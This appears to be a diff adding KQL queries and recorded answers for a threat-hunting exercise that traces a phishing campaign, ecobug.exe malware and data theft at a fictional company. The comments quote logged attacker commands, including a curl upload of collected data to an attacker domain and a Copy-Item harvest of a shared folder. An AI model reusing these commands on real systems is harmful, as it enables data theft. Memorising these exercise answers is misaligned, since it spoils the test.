@@ -78,3 +78,139 @@ PassiveDns
 | where ip in ("98.117.26.236", "13.201.46.208", "105.78.23.64", "56.6.30.190")
 | distinct domain
 | count
+
+//Section 3 
+
+// Q1
+Email
+| where link has "energy-trends4u.net" or link has "news-on-industry.com" or link has "eco-awareness-update.net"
+// 56
+
+
+// Q2 - Q3
+Email
+| where link has "energy-trends4u.net" or link has "news-on-industry.com" or link has "eco-awareness-update.net"
+| distinct link //sender or link
+// news@eco-awareness-updates.net ; energy_industry_news@protonmail.com ; electric_updates@gmail.com
+// Energy_Industry_Trends_2024_4_Solvi.docx - Recent_Mergers_and_Acquisitions_in_Energy_Industry.docx - Eco_Awareness_Update_2024.docx
+
+// Q4, Q6 
+let unlucky_recipient = 
+Email
+| where link has "Energy_Industry_Trends_2024_4_Solvi.docx" or link has "Recent_Mergers_and_Acquisitions_in_Energy_Industry.docx" or link has "Eco_Awareness_Update_2024.docx"
+| distinct recipient;
+Employees
+| where email_addr in (unlucky_recipient)
+| distinct role
+
+
+// Q5
+let unlucky_recipient = 
+Email
+| where link has "Energy_Industry_Trends_2024_4_Solvi.docx" or link has "Recent_Mergers_and_Acquisitions_in_Energy_Industry.docx" or link has "Eco_Awareness_Update_2024.docx"
+| distinct recipient;
+Employees
+| where email_addr in (unlucky_recipient) and role == "Customer Support Specialist"
+
+// Q7 - 12
+Email
+| where link has "Energy_Industry_Trends_2024_4_Solvi.docx" or link has "Recent_Mergers_and_Acquisitions_in_Energy_Industry.docx" or link has "Eco_Awareness_Update_2024.docx"
+// 2024-05-01T15:51:41Z - carla_wharton@solvisystems.com - sender:news@eco-awareness-updates.net - reply:electric_updates@gmail.com
+//[EXTERNAL] Business Opportunity: Two major energy companies merging
+// http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx
+
+//Q14
+Employees
+| where name == "Carla Wharton"
+// 10.10.0.164 - cawharton - JUSP-LAPTOP
+
+OutboundNetworkEvents
+| where src_ip == "10.10.0.164" and url has "news-on-industry"
+// 2024-05-01T15:57:41Z
+
+// Q15
+ProcessEvents
+| where hostname == "JUSP-LAPTOP"
+// ecobug - 2024-05-01T15:59:25Z
+
+// Q16
+FileCreationEvents
+| where hostname == "JUSP-LAPTOP" and filename =="ecobug.exe"
+
+// Section 4
+// Q1
+FileCreationEvents
+| where filename == "ecobug.exe"
+
+// Q2
+// 98.117.26.236 1337
+// 2024-05-01T17:38:25Z
+
+// Q4 - Q6
+NetworkFlow
+| where src_ip == "10.10.0.164" and dest_ip == "98.117.26.236"
+
+// Q7
+NetworkFlow
+| where dest_ip == "98.117.26.236"
+
+// Q8
+NetworkFlow
+| where dest_ip == "98.117.26.236"
+| distinct src_ip
+
+// Q9
+ProcessEvents
+| where hostname == "JUSP-LAPTOP"
+
+// Section 5
+// Q1-Q3
+ProcessEvents
+| where process_commandline has "net use"
+| distinct process_commandline
+// net use /PERSISTENT:YES
+//2024-05-27T16:23:10Z - alpetrov - SJ9V-MACHINE
+
+// Q6
+Employees
+| where hostname == "SJ9V-MACHINE"
+// Alexei Petrov
+
+// Q9
+FileCreationEvents
+| where hostname == "SJ9V-MACHINE" 
+
+ProcessEvents
+| where hostname == "SJ9V-MACHINE" and process_commandline has "ecobug"
+//2024-05-03T15:47:48Z
+
+// Q9 (second one)
+ProcessEvents
+| where hostname == "SJ9V-MACHINE"
+// curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload
+
+// Q10
+ProcessEvents
+| where hostname == "SJ9V-MACHINE"
+// Copy-Item -Path \\\\solvisystems.com\\SharedDocs\\SoftwareDevelopment\\CycleDocuments\\* -Destination C:\\Users\\alpetrov\\CollectedData\\Software_Cycle_Docs
+
+// Q11
+ProcessEvents
+| where process_commandline has "curl -F 'file=@C:\\DataExfil\\CollectedData.zip' https://api.eco-awareness-update.net/upload"
+
+//Q12
+InboundNetworkEvents
+| where src_ip in ("98.117.26.236", "13.201.46.208", "105.78.23.64", "56.6.30.190")
+
+// Q13
+let comp_users =
+ProcessEvents
+| where process_commandline has "curl -F 'file=@C:\\DataExfil\\CollectedData.zip' https://api.eco-awareness-update.net/upload"
+| distinct username;
+let comp_emails =
+Employees
+| where username in (comp_users)
+| distinct email_addr;
+Email
+| where sender in (comp_emails)
+// lol
